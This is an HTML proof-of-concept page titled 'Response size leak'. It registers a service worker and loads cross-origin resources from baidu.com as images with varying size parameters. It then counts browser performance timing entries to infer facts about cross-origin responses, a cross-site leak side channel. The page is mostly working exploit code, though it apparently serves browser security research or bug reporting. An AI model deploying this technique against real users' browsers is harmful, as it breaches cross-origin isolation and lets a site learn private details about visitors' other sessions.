<!DOCTYPE html>
<html>
  <head>
    <title>Response size leak</title>
    <script>

      addEventListener("load", async () => {
        performance.setResourceTimingBufferSize(1337);
        const registration = await navigator.serviceWorker.register('/range-serviceworker/serviceworker.js');
        if (registration.installing)
          location.reload();
      });

      function show(url, size, event, diff) {
        document.getElementById('res').innerHTML += `<tr><td>${url}</td><td>${size}</td><td>${event}</td><td>${diff}</td><tr>`;
        console.log(performance.getEntries());
      }
      function get(url, size) {
        let start = performance.getEntries().length;
        let element = document.createElement('img');
        element.src = `${url}?size=${size}&${Math.random()}`;

        element.onload = () => {
          let diff = performance.getEntries().length - start;
          show(url, size, 'onload', diff);
        }
        element.onerror = () => {
          let diff = performance.getEntries().length - start;
          show(url, size, 'onerror', diff);
        }
      }

      function run() {
        urls = [
          'https://www.baidu.com/robots.txt',
          'https://www.baidu.com/robots.txt',
          'https://www.baidu.com/asdfas',
          'https://www.baidu.com/asdfas',
          'https://www.baidu.com/favicon.ico',
          'https://www.baidu.com/favicon.ico',
        ]
        sizes = [
          1,
          1000000,
          1,
          1000000,
          1,
          1000000,
        ]
        for (let i = 0; i < urls.length; i++) {
          setTimeout(get, (i + 1) * 1000, urls[i], sizes[i]);
        }
      }
      
      onload = () => {
        run();
      }

    </script>
  </head>

  <body>
    <table id="res">
      <tr>
        <th>URL</th>
        <th>Size</th>
        <th>Event</th>
        <th>Entries</th>
      </tr>
    </table>
  </body>

</html>